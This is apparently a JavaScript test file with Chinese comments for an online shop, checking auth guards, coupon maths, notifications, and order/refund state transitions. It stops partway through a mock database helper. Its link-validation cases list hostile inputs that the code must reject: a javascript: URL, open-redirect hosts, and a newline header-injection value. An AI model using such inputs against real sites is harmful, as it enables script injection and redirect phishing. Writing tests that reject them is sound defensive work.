// requireUser 的第三参从 boolean 改成了最低 rank。旧调用方写 true 表示「只有 admin」，那个含义必须保留，
// 否则任何漏改的调用点会静默地把接口开放给所有登录用户。
let guardStatus = 0
const guardRes = { status(code) { guardStatus = code }, setHeader() {}, send() {} }
for (const need of [true, false, 0, RANK.ADMIN, RANK.STAFF, undefined]) {
  guardStatus = 0
  assert(await requireUser({ headers: {} }, guardRes, need) === null && guardStatus === 401,
    `requireUser(need=${String(need)}) must reject a request with no token`)
}

console.log('Permission groups and GitHub team sync: OK')

// §1 优惠券。这一段测的几乎全是「不会抛异常、只会算错钱」的情形——那类 bug 在生产上的第一个症状
// 通常是支付渠道的对账差异，离原因已经很远了，所以在这里钉死。

// 取整方向。折扣额 floor，也就是零头归商家；这一条要是被改成 ceil，每笔多折一分，测试必须失败。
// 注意单位：这里的 101 是 101 个最小单位（分），不是 101 元。9.5 折的折扣是 amount/20，所以要触发取整，
// 金额必须不能被 20 整除——写成 10100（101 元）就除得尽，那样这条断言测不到任何取整行为。
assert(applyActions([{ type: 'percent', value: 9500 }], 101).discountMinor === 5,
  '101 分打 9.5 折应折 5.05 分，实折必须是 5 分（折扣额向下取整）')
assert(applyActions([{ type: 'percent', value: 9500 }], 101).amountMinor === 96,
  '折后金额必须是原价减实际折扣，不能对金额单独取整')
assert(applyActions([{ type: 'percent', value: 9500 }], 1).discountMinor === 0,
  '1 分钱打 9.5 折的折扣被抹成 0，是取整方向的已知代价，改动这个行为要同时改注释')
// discountMinor 和 amountMinor 必须始终互补，否则「原价 - 实付」和记账里的折扣额对不上。
for (const [amount, pct] of [[1, 9500], [7, 3333], [99, 6667], [10000, 100], [123456, 8889]]) {
  const r = applyActions([{ type: 'percent', value: pct }], amount)
  assert(r.amountMinor + r.discountMinor === amount, `折扣与实付必须互补（${amount} @ ${pct}）`)
  assert(Number.isInteger(r.amountMinor) && r.amountMinor >= 0, '实付必须是非负整数')
}

// 顺序敏感是有意的：先减后折和先折后减结果不同，配置数组的顺序就是执行顺序。
const cutThenPct = applyActions([{ type: 'fixed', value: 1000 }, { type: 'percent', value: 9000 }], 10000)
const pctThenCut = applyActions([{ type: 'percent', value: 9000 }, { type: 'fixed', value: 1000 }], 10000)
assert(cutThenPct.amountMinor === 8100 && pctThenCut.amountMinor === 8000,
  '动作顺序必须影响结果，合并同类项或排序都会算错')

// 逐步夹到 0，而不是只夹最后一次。
assert(applyActions([{ type: 'fixed', value: 20000 }, { type: 'delta', value: 10000 }], 10000).amountMinor === 10000,
  '中间夹 0 之后的加价从 0 起算')
assert(applyActions([{ type: 'percent', value: 0 }], 12345).amountMinor === 0, 'value=0 是全免')
assert(applyActions([{ type: 'percent', value: 10000 }], 12345).amountMinor === 12345, 'value=10000 是原价')
// 非整数金额必须抛，而不是静默地按浮点算。
let threw = false
try { applyActions([], 10.5) } catch { threw = true }
assert(threw, '浮点金额必须抛异常，钱不能走浮点路径')
// 形状非法的动作被跳过而不是让整笔结算失败。
assert(applyActions([{ type: 'percent', value: 20000 }, { type: 'fixed', value: 100 }], 1000).amountMinor === 900,
  '越界的动作跳过，合法的照常执行')

// 币种不匹配判条件不成立，而不是报错——多币种站点上一张配错币种的券不该让结算 500。
const amountCond = { type: 'amount', op: 'gte', value: 10000, currency: 'USD' }
assert(evaluateCondition(amountCond, { amountMinor: 20000, currency: 'USD' }) === true, '同币种且满额应成立')
assert(evaluateCondition(amountCond, { amountMinor: 20000, currency: 'JPY' }) === false, '异币种必须判不成立')
assert(evaluateCondition(amountCond, { amountMinor: 20000, currency: 'usd' }) === true, '币种比较不区分大小写')
assert(evaluateCondition(amountCond, { amountMinor: 10000, currency: 'USD' }) === true, 'gte 含端点')
assert(evaluateCondition({ ...amountCond, op: 'gt' }, { amountMinor: 10000, currency: 'USD' }) === false, 'gt 不含端点')

// SKU 六种匹配全覆盖。
const skuCases = [
  ['is', 'aetherac-pro', true], ['is', 'aetherac', false],
  ['is_not', 'aetherac', true], ['is_not', 'aetherac-pro', false],
  ['contains', 'ether', true], ['contains', 'zzz', false],
  ['not_contains', 'zzz', true], ['not_contains', 'ether', false],
  ['starts_with', 'aether', true], ['starts_with', 'pro', false],
  ['ends_with', 'pro', true], ['ends_with', 'aether', false]
]
for (const [op, value, expected] of skuCases) {
  assert(evaluateCondition({ type: 'sku', op, value }, { sku: 'aetherac-pro' }) === expected,
    `SKU ${op} ${value} 的判定错了`)
}

// 历史订单条件按状态求和，不是逐个比较。
const hist = { counts: { paid: 2, refunded: 1, cancelled: 5 } }
assert(evaluateCondition({ type: 'order_history', statuses: ['paid', 'refunded'], op: 'gte', count: 3 }, { history: hist }) === true,
  '多状态必须求和（2 + 1 >= 3）')
assert(evaluateCondition({ type: 'order_history', statuses: ['paid'], op: 'gte', count: 3 }, { history: hist }) === false,
  '单状态不该借到别的状态的计数')
assert(evaluateCondition({ type: 'order_history', statuses: ['paid'], op: 'gte', count: 1 }, {}) === false,
  '缺 history 时计数按 0 算，条件不成立而不是崩')

// 首单按「付过钱」判，不是按「下过单」判：下单未付、过期作废的用户仍算首单。
assert(evaluateCondition({ type: 'first_order', value: true }, { history: { counts: { pending: 3, expired: 2 } } }) === true,
  '只下过未付款的单仍算首单')
assert(evaluateCondition({ type: 'first_order', value: true }, { history: { counts: { paid: 1 } } }) === false,
  '付过款就不是首单')
assert(evaluateCondition({ type: 'first_order', value: true }, { history: { counts: { refunded: 1 } } }) === false,
  '退过款也算付过，不是首单')

// 未知条件类型判不成立，绝不能「忽略后继续」——那会让同一张券在旧版代码上更容易满足。
assert(evaluateCondition({ type: 'no_such_thing' }, {}) === false, '未知条件类型必须判不成立')
assert(validateCondition({ type: 'no_such_thing' }).ok === false, '未知条件类型必须校验失败')
assert(evaluateCondition({ type: 'amount', op: 'gte', value: 1 }, { amountMinor: 100, currency: 'USD' }) === false,
  '缺币种的金额条件形状非法，判不成立')

// 全部条件 AND，且要能指出是哪几条不成立。
const conds = [amountCond, { type: 'sku', op: 'contains', value: 'pro' }]
assert(evaluateConditions(conds, { amountMinor: 20000, currency: 'USD', sku: 'aetherac-pro' }).ok === true, '全部满足')
const partial = evaluateConditions(conds, { amountMinor: 100, currency: 'USD', sku: 'aetherac-pro' })
assert(partial.ok === false && partial.failed.length === 1 && partial.failed[0].type === 'amount',
  '不成立的条件必须能被指认出来')
assert(evaluateConditions([], {}).ok === true, '无条件的券对任何订单都成立')
assert(evaluateConditions(null, {}).ok === true, 'conditions 为 null 时不能崩')

// 券形状校验。
assert(validateCoupon({ code: 'save10', conditions: [], actions: [{ type: 'fixed', value: 100 }] }).code === 'SAVE10',
  '券码必须归一成大写，因为唯一索引建在 upper(code) 上')
assert(validateCoupon({ code: 'ab', conditions: [], actions: [{ type: 'fixed', value: 1 }] }).ok === false, '券码太短')
assert(validateCoupon({ code: 'has space', conditions: [], actions: [{ type: 'fixed', value: 1 }] }).ok === false, '券码不允许空格')
assert(validateCoupon({ code: 'ok1', conditions: [], actions: [] }).ok === false, '没有动作的券什么都不做，应拒')
assert(validateCoupon({ code: 'ok1', conditions: [], actions: [{ type: 'fixed', value: 1 }], allowed_user_ids: [] }).ok === false,
  '空的可用名单等于谁都不能用，是个容易配错的形状，必须拒并说明')
assert(validateCoupon({ code: 'ok1', conditions: [], actions: [{ type: 'fixed', value: 1 }], allowed_user_ids: null }).ok === true,
  'null 才是「不限」')
assert(validateCoupon({ code: 'ok1', conditions: [], actions: [{ type: 'fixed', value: 1 }], per_user_limit: 0 }).ok === true,
  '0 是合法的 per_user_limit（一次都不能用），不能和 null 混为一谈')
assert(validateCoupon({
  code: 'ok1', conditions: [], actions: [{ type: 'fixed', value: 1 }],
  starts_at: '2026-02-01T00:00:00Z', ends_at: '2026-01-01T00:00:00Z'
}).ok === false, '生效时间晚于失效时间应拒')
// 错误信息要指出是第几条，否则管理员配了十条条件后无从下手。
const badAt = validateCoupon({ code: 'ok1', conditions: [amountCond, { type: 'sku', op: 'nope', value: 'x' }], actions: [{ type: 'fixed', value: 1 }] })
assert(badAt.ok === false && /第 2 条条件/.test(badAt.error), '校验错误必须定位到第几条条件')

// 可用性里不依赖数据库的那一半。per_user_limit 不在这里判，它必须由 redeem_coupon 原子地判。
const now = new Date('2026-06-01T00:00:00Z')
assert(checkAvailability({ enabled: false }, { now }).ok === false, '停用的券不可用')
assert(checkAvailability({ enabled: true, starts_at: '2026-07-01T00:00:00Z' }, { now }).ok === false, '未开始')
assert(checkAvailability({ enabled: true, ends_at: '2026-05-01T00:00:00Z' }, { now }).ok === false, '已过期')
assert(checkAvailability({ enabled: true, total_limit: 5, used_count: 5 }, { now }).ok === false, '总量用尽')
assert(checkAvailability({ enabled: true, total_limit: null, used_count: 99999 }, { now }).ok === true, 'null 总量 = 不限')
assert(checkAvailability({ enabled: true, allowed_user_ids: ['u1'] }, { now, userId: 'u2' }).ok === false, '不在名单里')
assert(checkAvailability({ enabled: true, allowed_user_ids: ['u1'] }, { now, userId: 'u1' }).ok === true, '在名单里')

// quote 把两半合起来，失败时要带上人能读的原因。
const coupon = { enabled: true, conditions: [amountCond], actions: [{ type: 'percent', value: 9000 }] }
const good = quote(coupon, { amountMinor: 20000, currency: 'USD', now, userId: 'u1' })
assert(good.ok === true && good.discountMinor === 2000 && good.amountMinor === 18000, 'quote 的折扣算错了')
const bad = quote(coupon, { amountMinor: 100, currency: 'USD', now, userId: 'u1' })
assert(bad.ok === false && bad.discountMinor === 0 && bad.amountMinor === 100 && /不低于/.test(bad.error),
  '不满足条件时折扣必须是 0，且原因要说得出来')

// 零小数位币种不能除 100。把 1000 日元显示成 10 日元是会被用户当成标错价的。
assert(formatMinor(1000, 'JPY') === '1000 JPY', '日元没有小数位')
assert(formatMinor(1000, 'USD') === '10.00 USD', '美元有两位小数')
assert(formatMinor(1000) === '10.00', '不给币种时只给数字')

// 描述文本：后台和结算页共用，不能两处各写一份中文。
assert(describeAction({ type: 'percent', value: 9000 }) === '打 9 折（减 10%）', '整折的文案')
assert(describeAction({ type: 'percent', value: 9500 }) === '打 9.5 折（减 5%）', '半折的文案')
assert(describeAction({ type: 'percent', value: 10000 }) === '不打折', '原价的文案')
assert(describeAction({ type: 'percent', value: 0 }) === '全额免除', '全免的文案')
assert(describeAction({ type: 'delta', value: -500 }) === '减 5.00', '负 delta 读作减价')
assert(describeAction({ type: 'delta', value: 500 }) === '加 5.00', '正 delta 读作加价')
assert(/不低于 100.00 USD/.test(describeCondition(amountCond)), '金额条件要带币种')
assert(describeCondition({ type: 'first_order', value: true }) === '仅限首次购买', '首单条件的文案')
assert(describeCondition(null) === '（无效条件）', '坏数据要有兜底文案，不能崩在渲染里')

// 枚举本身：这些数组是前端下拉框的数据源，少一项就是一种规则配不出来。
assert(CONDITION_TYPES.length === 5 && SKU_OPERATORS.length === 6 && AMOUNT_OPERATORS.length === 6 && ACTION_TYPES.length === 3,
  '条件/动作枚举的数量变了，前端下拉框和这里要一起改')
for (const op of AMOUNT_OPERATORS) {
  assert(validateCondition({ type: 'amount', op, value: 1, currency: 'USD' }).ok, `${op} 必须是合法的金额比较`)
}
for (const t of ACTION_TYPES) {
  assert(validateAction({ type: t, value: t === 'percent' ? 9000 : 100 }).ok, `${t} 必须是合法的动作`)
}

console.log('Coupon conditions and actions: OK')

// §9 站内信。

// 两份订单路径实现必须一致。shared/notifications.mjs 里的 orderHref 是 routes.ts 里 orderPath 的第二份
// 实现（理由写在那边的注释里），这条断言是那份重复的全部安全保障。
for (const id of ['11111111-2222-3333-4444-555555555555', 'abc', '需要转义的 id']) {
  assert(orderHref(id) === orderPath(id), `orderHref 与 orderPath 必须给出同一个结果（${id}）`)
}

// 站内信是单向的，所以不该有任何回复类动作。这条断言是把 §9 那句「不可回复」钉在代码里——
// 将来有人想加 reply，会先撞到这里，而不是等到用户在一个没人看的地方提了问题。
assert(!NOTIF_ACTION_TYPES.some(t => /reply|respond|answer/i.test(t)), '站内信是单向的，不能有回复类动作')

// scope 和 recipient_id 必须同生共死，schema.sql 里那条 check 约束是同一件事。
const baseNotif = { kind: 'system', scope: 'all', title: '标题', body: '正文' }
assert(validateNotification(baseNotif).ok === true, '最小合法站内信')
assert(validateNotification({ ...baseNotif, scope: 'user' }).ok === false, 'scope=user 缺 recipient_id 应拒')
assert(validateNotification({ ...baseNotif, scope: 'user', recipient_id: 'u1' }).ok === true, 'scope=user 带 recipient_id')
assert(validateNotification({ ...baseNotif, recipient_id: 'u1' }).ok === false, '广播范围带 recipient_id 应拒')
assert(validateNotification({ ...baseNotif, kind: 'nope' }).ok === false, '未知类型应拒')
assert(validateNotification({ ...baseNotif, scope: 'nope' }).ok === false, '未知范围应拒')
assert(validateNotification({ ...baseNotif, title: '' }).ok === false, '空标题应拒')
assert(validateNotification({ ...baseNotif, body: '  ' }).ok === false, '空白正文应拒')
assert(validateNotification({ ...baseNotif, state: null }).ok === true, 'state 可以是 null（不是待办）')
assert(validateNotification({ ...baseNotif, state: 'nope' }).ok === false, '未知 state 应拒')

// kind 的两份声明必须一致：JS 这份决定能不能提交，schema.sql 那条 check 决定能不能落库。
// 只有 JS 多一个值的时候，validateNotification 会放行、数据库会拒——而调用方只看到一句约束名，
// 于是「通知一条都发不出去」被当成偶发故障。所以两边逐值双向对齐。
const kindCheck = schemaSql.match(/kind text not null default 'system' check \(kind in \(([^)]*)\)\)/)
assert(kindCheck, 'schema.sql 里必须有 notifications.kind 的 check 约束，否则任何字符串都能落库')
const sqlKinds = kindCheck[1].split(',').map(s => s.trim().replace(/^'|'$/g, ''))
for (const kind of NOTIFICATION_KINDS) {
  assert(sqlKinds.includes(kind), `notifications.kind 的 check 缺 '${kind}'——这种类型的站内信会被数据库拒掉`)
  assert(KIND_LABEL[kind], `${kind} 需要中文标签，否则收件箱里显示成裸 slug`)
}
for (const kind of sqlKinds) {
  assert(NOTIFICATION_KINDS.includes(kind), `schema.sql 允许 '${kind}' 但 NOTIFICATION_KINDS 没有——库里会出现前端认不出的行`)
}
// §9.6 的强制置顶靠 kind 区分，所以 refund 和 refund_approval 不能合成一个值。
assert(NOTIFICATION_KINDS.includes('refund') && NOTIFICATION_KINDS.includes('refund_approval'),
  '退款告知和退款审批必须是两种类型，否则普通告知也会占住置顶位')

// 外链必须拒。一条管理员发的站内信如果能挂外链，就是个带站点信誉的钓鱼入口，而站内信恰好是
// 用户最容易信任的位置。
const linkCases = [
  ['/order?order_id=x', true],
  ['/admin', true],
  ['https://example.com', false],
  ['//example.com', false],
  ['/\\example.com', false],
  ['javascript:alert(1)', false],
  ['order', false],
  ['/ok\nX-Injected: 1', false]
]
for (const [href, expected] of linkCases) {
  assert(validateNotifAction({ type: 'link', label: '去', href }).ok === expected,
    `link href 的判定错了：${JSON.stringify(href)}`)
}
assert(validateNotifAction({ type: 'link', href: '/ok' }).ok === false, '按钮必须有文案')

// 作用在对象上的动作必须带合法 uuid，否则就是个点不动的按钮。
const rid = '11111111-2222-3333-4444-555555555555'
assert(validateNotifAction({ type: 'approve_refund', label: '批准', target: rid }).ok === true, '合法的批准按钮')
assert(validateNotifAction({ type: 'approve_refund', label: '批准' }).ok === false, '缺 target 应拒')
assert(validateNotifAction({ type: 'approve_refund', label: '批准', target: 'not-a-uuid' }).ok === false, 'target 必须是 uuid')
assert(validateNotifAction({ type: 'mark_read', label: '知道了' }).ok === true, 'mark_read 不需要 target')
assert(validateNotifAction({ type: 'nope', label: 'x' }).ok === false, '未知动作类型应拒')
const tooMany = { ...baseNotif, actions: Array.from({ length: 7 }, () => ({ type: 'mark_read', label: 'x' })) }
assert(validateNotification(tooMany).ok === false, '按钮太多应拒')
const badBtn = { ...baseNotif, actions: [{ type: 'mark_read', label: 'ok' }, { type: 'link', label: '去', href: 'http://x' }] }
assert(validateNotification(badBtn).ok === false && /第 2 个按钮/.test(validateNotification(badBtn).error),
  '按钮校验错误必须定位到第几个')

// §9.6：待审批的通知强制置顶高亮。漏掉的表现是一条等着人批的退款躺在列表第二十行。
const approval = refundApprovalNotification({
  refundId: rid, orderNo: 'AE-2026-0001', amountText: '128.00 USD',
  reason: '重复支付', initiator: 'cs@example.com'
})
assert(validateNotification(approval).ok === true, '构造出来的审批通知本身必须合法')
assert(approval.state === 'pending' && approval.scope === 'admin' && approval.refund_id === rid, '审批通知的关键字段')
assert(presentationFor(approval).pinned === true && presentationFor(approval).highlighted === true,
  '待审批必须置顶高亮')
assert(presentationFor({ ...baseNotif, state: null }).pinned === false, '普通通知不置顶')
assert(presentationFor({ state: 'pending', actions: [{ type: 'mark_read', label: 'x' }] }).pinned === false,
  '只有含管理员动作的待办才置顶，一个「知道了」不算待审批')
// 三个按钮齐全，且批准按钮的文案带金额——管理员可能同时收到好几条，「批准」两个字在列表里长得一样。
assert(approval.actions.map(a => a.type).join(',') === 'approve_refund,reject_refund,transfer_refund',
  '§10.3 要求批准/拒绝/转交三个按钮')
assert(/128\.00 USD/.test(approval.actions[0].label), '批准按钮的文案要带金额')
assert(approval.body.includes('重复支付') && approval.body.includes('AE-2026-0001'), '正文要带原因和订单号')

// 超时升级是新的一条，不是改旧的那条。原地改标题的话，已读过原通知的管理员不会再收到任何提示，
// 而超时提醒的全部意义就是提示那个看过但没处理的人。
const esc = refundEscalationNotification({ refundId: rid, orderNo: 'AE-2026-0001', amountText: '128.00 USD', hours: 48 })
assert(validateNotification(esc).ok === true, '升级提醒必须合法')
assert(/48 小时/.test(esc.title) && esc.state === 'pending', '升级提醒要写明超时时长且仍是待办')
assert(!esc.actions.some(a => a.type === 'transfer_refund'), '升级提醒不给转交，此时要的是尽快决定')

// 退款结果通知：单向、只带一个跳转，且成功和失败的文案不同。
const done = refundDoneNotification({ userId: 'u1', orderNo: 'AE-1', orderId: rid, amountText: '10.00 USD', ok: true })
assert(validateNotification(done).ok === true && done.scope === 'user' && done.state === null, '退款完成通知不是待办')
assert(done.actions.length === 1 && done.actions[0].type === 'link' && done.actions[0].href === orderPath(rid),
  '退款完成通知只给一个订单页跳转，且路径必须和 orderPath 一致')
const failed = refundDoneNotification({ userId: 'u1', orderNo: 'AE-1', orderId: rid, amountText: '10.00 USD', ok: false, note: '渠道拒绝' })
assert(/未成功/.test(failed.title) && /渠道拒绝/.test(failed.body), '失败通知要说明原因')

// 权限与确认：这三份名单必须和接口侧一致，列在这里只是为了不显示注定 403 的按钮。
assert(ADMIN_ONLY_ACTIONS.every(t => NOTIF_ACTION_TYPES.includes(t)), '管理员动作必须都是已知动作')
assert(needsConfirm('approve_refund') === true, '批准退款不可逆，必须二次确认')
assert(needsConfirm('reject_refund') === false, '拒绝可以重新发起，不需要不可逆确认')
assert(needsReason('reject_refund') === true && needsReason('transfer_refund') === true, '拒绝和转交都必须填原因')
assert(needsReason('approve_refund') === false, '批准不强制填原因')
assert(canUseAction('approve_refund', RANK.STAFF) === false, '客服看不到批准按钮')
assert(canUseAction('approve_refund', RANK.ADMIN) === true, '管理员看得到批准按钮')
assert(canUseAction('link', 0) === true, '跳转按钮对谁都可见')
// 每个需要打接口的动作都要有 endpoint，否则前端拿到一个不知道往哪发的按钮。
for (const t of NOTIF_ACTION_TYPES) {
  if (t === 'link' || t === 'mark_read') continue
  assert(typeof ACTION_ENDPOINT[t] === 'string' && ACTION_ENDPOINT[t].startsWith('/api/'),
    `${t} 缺少接口映射`)
}

console.log('Notification shapes and refund approval: OK')

// --- §13 订单与退款状态机 ---------------------------------------------------------------------------
// 三份声明必须一致：shared/orders.mjs（界面和接口共用）、public.order_status 枚举、
// refund_requests_status_check。JS 多一个值时的后果最隐蔽——校验放行、Postgres 拒收。
const orderEnum = schemaSql.match(/create type public\.order_status as enum \(([^)]*)\)/)
assert(orderEnum, 'schema.sql 必须声明 public.order_status')
const sqlOrderStatuses = orderEnum[1].split(',').map(s => s.trim().replace(/^'|'$/g, ''))
assert(sqlOrderStatuses.length === ORDER_STATUSES.length,
  `order_status 枚举有 ${sqlOrderStatuses.length} 个值，ORDER_STATUSES 有 ${ORDER_STATUSES.length} 个`)
for (const s of ORDER_STATUSES) {
  assert(sqlOrderStatuses.includes(s), `public.order_status 缺 '${s}'`)
  assert(ORDER_STATUS_LABEL[s], `${s} 需要中文标签`)
  assert(Array.isArray(ORDER_TRANSITIONS[s]), `${s} 必须在迁移表里有一条（终态写空数组）`)
}
for (const s of sqlOrderStatuses) {
  assert(ORDER_STATUSES.includes(s), `枚举允许 '${s}' 但 ORDER_STATUSES 没有——库里会出现前端认不出的订单`)
}
// expired 曾经在 JS 那份里，枚举里从来没有。这条断言防止它被谁又加回来。
assert(!ORDER_STATUSES.includes('expired'), '没有 expired 这个状态，废弃结账单落到 cancelled')

const refundCheck = schemaSql.match(/refund_requests_status_check\s*\n?\s*check \(status in \(([^)]*)\)\)/)
assert(refundCheck, 'schema.sql 必须有 refund_requests_status_check')
const sqlRefundStatuses = refundCheck[1].split(',').map(s => s.trim().replace(/^'|'$/g, ''))
for (const s of REFUND_STATUSES) {
  assert(sqlRefundStatuses.includes(s), `refund_requests_status_check 缺 '${s}'`)
  assert(REFUND_STATUS_LABEL[s], `${s} 需要中文标签`)
  assert(Array.isArray(REFUND_TRANSITIONS[s]), `${s} 必须在退款迁移表里有一条`)
}
for (const s of sqlRefundStatuses) {
  assert(REFUND_STATUSES.includes(s), `check 允许 '${s}' 但 REFUND_STATUSES 没有`)
}

// 迁移表不能指向不存在的状态——一条指向 typo 的出边会让按钮亮着但接口永远拒。
for (const [from, outs] of Object.entries(ORDER_TRANSITIONS)) {
  for (const to of outs) assert(ORDER_STATUSES.includes(to), `ORDER_TRANSITIONS.${from} 指向未知状态 ${to}`)
}
for (const [from, outs] of Object.entries(REFUND_TRANSITIONS)) {
  for (const to of outs) assert(REFUND_STATUSES.includes(to), `REFUND_TRANSITIONS.${from} 指向未知状态 ${to}`)
}

// §13.1：退款只能从 PAID 出发。这是整节的地基，所以逐个状态钉一遍而不是只测 paid。
for (const s of ORDER_STATUSES) {
  assert(canTransition(s, 'refund_pending') === (s === 'paid'),
    `只有已支付订单能进入退款中，${s} 不该能`)
}
// §13 状态图里那个「无法退款」按钮：退款中要能退回已支付，否则订单永久卡住。
assert(canTransition('refund_pending', 'paid'), '退款中必须能退回已支付（无法退款）')
assert(canTransition('refund_pending', 'refunded'), '退款中必须能到已退款')
// paid → paid 不是合法迁移，尽管 §13.5 要求记一条 PAID → PAID 的日志。
assert(!canTransition('paid', 'paid'), 'paid → paid 是审计记录而不是迁移，否则幂等检查全部失效')
assert(!canTransition('refunded', 'paid') && !canTransition('cancelled', 'paid'), '终态不能回头')
assert(canTransition('unknown', 'paid') === false, '未知状态返回 false 而不是抛——调用方在决定按钮亮不亮')
assert(TERMINAL_ORDER_STATUSES.includes('refunded') && TERMINAL_ORDER_STATUSES.includes('cancelled'), '终态列表')
assert(!TERMINAL_ORDER_STATUSES.includes('paid'), '已支付不是终态')

// §13.4 的日志形式。库里存小写，渲染时才大写——两者分开是有意的。
assert(transitionLabel('paid', 'refund_pending') === 'PAID → REFUND_PENDING', '§13.4 的日志形式')

// 非法迁移的错误信息要说清合法的下一步，否则管理员只知道被拒不知道能干什么。
const terminalErr = assertTransition('cancelled', 'paid')
assert(terminalErr.ok === false && terminalErr.error.includes('终态'), '终态的错误信息要说明它是终态')
const illegalErr = assertTransition('pending', 'refunded')
assert(illegalErr.ok === false && illegalErr.error.includes('已支付') && illegalErr.error.includes('已取消'),
  '非法迁移要列出合法的下一步')
assert(assertTransition('paid', 'refund_pending').ok === true, '合法迁移放行')
assert(assertTransition('nope', 'paid').error.includes('未知的订单状态'), '未知状态单独一句')

// §13.2：灰按钮的悬浮文案。每种拒绝理由都要不同，否则用户看到同一句话却是不同原因。
const paidOrder = { status: 'paid', paid_amount_minor: 9900 }
const okRefund = canRequestRefund(paidOrder)
assert(okRefund.ok === true && okRefund.maxAmountMinor === 9900, '已支付订单可退，上限是实付金额')
const reasons = new Set()
for (const s of ORDER_STATUSES) {
  const r = canRequestRefund({ status: s, paid_amount_minor: 9900 })
  assert(r.ok === (s === 'paid'), `${s} 的可退性`)
  if (!r.ok) { assert(r.reason.length > 0, `${s} 必须有悬浮文案`); reasons.add(r.reason) }
}
assert(reasons.size === ORDER_STATUSES.length - 1, '每种不可退的原因要有各自的文案')
assert(canRequestRefund(null).ok === false, '订单不存在')
// 在途申请要拦。申请刚提交时订单还是 paid，光看状态会让同一单被提两次。
assert(canRequestRefund(paidOrder, { status: 'pending' }).ok === false, '已有待审批申请时不能再提')
assert(canRequestRefund(paidOrder, { status: 'executing' }).ok === false, '执行中不能再提')
assert(canRequestRefund(paidOrder, { status: 'rejected' }).ok === true, '被拒过可以重提')
assert(canRequestRefund(paidOrder, { status: 'completed' }).ok === true, '已完成的旧申请不拦新的')
assert(canRequestRefund({ status: 'paid', paid_amount_minor: 0 }).ok === false, '零金额订单没有可退金额')
// 老订单没有 paid_amount_minor（那是这次加的列），要退回 amount_minor。
assert(canRequestRefund({ status: 'paid', amount_minor: 500 }).maxAmountMinor === 500, '老订单退回 amount_minor')

// §10.2：金额可改但不得超过实付，且只收整数。
assert(validateRefundAmount(paidOrder, 9900).ok === true, '全额退款')
assert(validateRefundAmount(paidOrder, 1).ok === true, '部分退款')
assert(validateRefundAmount(paidOrder, 9901).ok === false, '超过实付应拒')
assert(validateRefundAmount(paidOrder, 0).ok === false, '零金额应拒')
assert(validateRefundAmount(paidOrder, -1).ok === false, '负金额应拒')
assert(validateRefundAmount(paidOrder, 99.5).ok === false, '浮点金额应拒——钱只走最小货币单位的整数')
assert(validateRefundAmount(paidOrder, '99').ok === false, '字符串金额应拒')

// §10.4 的退款迁移。转交绕回待审批，因为接手的人还得批或拒。
assert(canRefundTransition('transferred', 'pending'), '转交后回到待审批')
assert(canRefundTransition('failed', 'executing'), '失败可重试——新建申请会丢掉整条审批链')
assert(!canRefundTransition('pending', 'completed'), '不能跳过执行段')
assert(!canRefundTransition('rejected', 'pending'), '已拒绝是终态')
assert(assertRefundTransition('completed', 'executing').error.includes('终态'), '已完成是终态')

// §10.7：能代提的是售后、客服、管理员。presale 的 rank 和 postsale 一样，所以这里必须是名单不是阈值。
assert(!REFUND_PROXY_GROUPS.includes('presale'), '售前不该碰钱，尽管 rank 和售后相同')
assert(rankOf('presale') === rankOf('postsale'), '这两个组同 rank——正是不能用阈值的原因')
for (const g of REFUND_PROXY_GROUPS) assert(rankOf(g) >= RANK.STAFF, `${g} 至少是员工级`)
// 用户本人不在代提名单里，但必须能给自己的订单提——§13.3 的第一个入口就是用户订单页。
assert(!REFUND_PROXY_GROUPS.includes('user') && !REFUND_PROXY_GROUPS.includes('default'),
  '代提名单不含用户本人，那是另一条路径')
assert(REFUND_INITIATOR_ROLES.includes('user'), 'initiator_role 必须能记「用户自己提的」')
const roleCheck = schemaSql.match(/refund_requests_initiator_role_check\s*\n?\s*check \(initiator_role in \(([^)]*)\)\)/)
assert(roleCheck, 'schema.sql 必须有 initiator_role 的 check')
const sqlRoles = roleCheck[1].split(',').map(s => s.trim().replace(/^'|'$/g, ''))
assert(sqlRoles.length === REFUND_INITIATOR_ROLES.length, 'initiator_role 的取值数量两边要一致')
for (const r of REFUND_INITIATOR_ROLES) assert(sqlRoles.includes(r), `initiator_role 的 check 缺 '${r}'`)
assert(REFUND_APPROVER_GROUPS.length === 1 && REFUND_APPROVER_GROUPS[0] === 'admin', '只有管理员能审批')

// §13.5 的拒绝日志。
const rej = rejectionLogEntry('o1', 'a1', 'admin', '证据不足')
assert(rej.from_status === 'paid' && rej.to_status === 'paid', '拒绝记 PAID → PAID')
assert(rej.note.includes('证据不足'), '拒绝理由必须进日志——§10.3 要求拒绝必须填理由')
assert(transitionLabel(rej.from_status, rej.to_status) === 'PAID → PAID', '渲染成 §13.5 要求的形式')

console.log('Order and refund state machine: OK')

// --- api/_lib/notify.mjs ---------------------------------------------------------------------------
// 这四个写入函数跑在 service client 上，所以 update 上的过滤条件就是全部的并发保护——
// settleApproval 少一个 .eq('state','pending')，两个管理员同时点批准就会各自以为自己做了决定。
// 一个会录下所有调用的假 db 把这些条件钉住。
const recorder = (results = {}) => {
  const calls = []
  const rec = { calls, tables: [] }
  rec.from = table => {
    rec.tables.push(table)
    const entry = { table, op: null, payload: null, filters: {}, selected: null }
    calls.push(entry)
    // 同一张表的结果可以有三种给法：
    //   - 一个对象：这张表的每次调用都给它
    //   - 一个数组：按调用顺序消费（refund-request 先查在途申请再插入），用完重复最后一个
    //   - 一个函数：拿到 entry 自己决定，用于 site_settings 这种要按 key 分别作答的
    // 三种都需要，因为审批那条链路会在同一张表上做完全不同的几次调用。
    const slot = results[table]
    const resolveResult = () => {
      if (typeof slot === 'function') return slot(entry) ?? { data: null, error: null }
      if (Array.isArray(slot)) return (slot.length > 1 ? slot.shift() : slot[0]) ?? { data: null, error: null }
      return slot ?? { data: null, error: null }
    }
    const link = {
      eq(col, val) { entry.filters[col] = val; return link },
      select(cols) { entry.selected = cols ?? '*'; return link },
      // order 可以链两次（收件箱是「置顶优先、再按时间倒序」），所以记成数组而不是覆盖一个字段。
      order(col, opts) { (entry.orders ??= []).push({ col, ...opts }); entry.order = { col, ...opts }; return link },
      limit(n) { entry.limit = n; return link },
      // or 的参数是一整条拼出来的字符串，原样留着——收件箱的可见性就靠它收窄，测试要能看出
      // 里面到底放进了哪些 scope。
      or(expr) { entry.or = expr; return link },
      in(col, vals) { (entry.in ??= {})[col] = vals; return link },
      lt(col, val) { (entry.lt ??= {})[col] = val; return link },
      // is 要记，而且要能和 eq 区分。会话的「售前没有订单」是 .is('order_id', null)，写成
      // .eq('order_id', null) 在 PostgREST 里匹配不到任何行——于是每次点客服都新建一个会话，
      // 而唯一索引会把第二次变成一句报错。
